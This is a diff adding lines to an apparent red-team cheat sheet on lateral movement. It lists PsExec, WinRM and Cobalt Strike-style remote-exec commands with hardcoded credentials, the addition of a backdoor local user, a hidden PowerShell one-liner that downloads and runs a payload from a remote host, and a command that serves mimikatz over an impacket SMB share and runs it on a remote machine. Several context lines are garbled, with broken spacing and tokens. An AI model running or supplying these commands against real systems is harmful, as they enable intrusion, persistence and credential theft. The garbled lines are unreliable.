@@ -57,6 +57,16 @@ remote-exec psexec wkstn-4945 cmd.exe /c "net user rastamouse Passw0rd! /add && 
 remote-exec winrm wkstn-4945 net localgroup administrators
 shell psexec.exe \\ 192.168 . 200.66 -u Administrator -p Hacker @ 1 . whoami
 psexec.exe the shell 192.168 . 200.66 -u Administrator -p @ Hacker . 1 PowerShell.exe -nop -w hidden -C IEX ((. new new - Object net.webclient) .downloadstring ( ' HTTP: //192.168. 200.222:8080/payload.txt ' ))
+
+
+PSEXEC \\192.168.100.199 "c:\windows\temp\foobar.exe"
+PSEXEC \\192.168.100.199 -c c:\windows\temp\foobar.exe -u Operator -p 123456 
+PSEXEC \\192.168.100.199 -s cmd /c copy \\server21\share45\file.ext c:\localpath
+psexec \\192.168.100.199 -u Domain\User -p Password ipconfig
+
+impacket-smbserver MeMe /msbuild -smb2support
+PsExec64.exe \\PC1  -u Operator -p 123456 cmd.exe /c \\10.0.0.21\MeMe\mimikatz.exe
+
 ```
 
 ### Remote File Upload
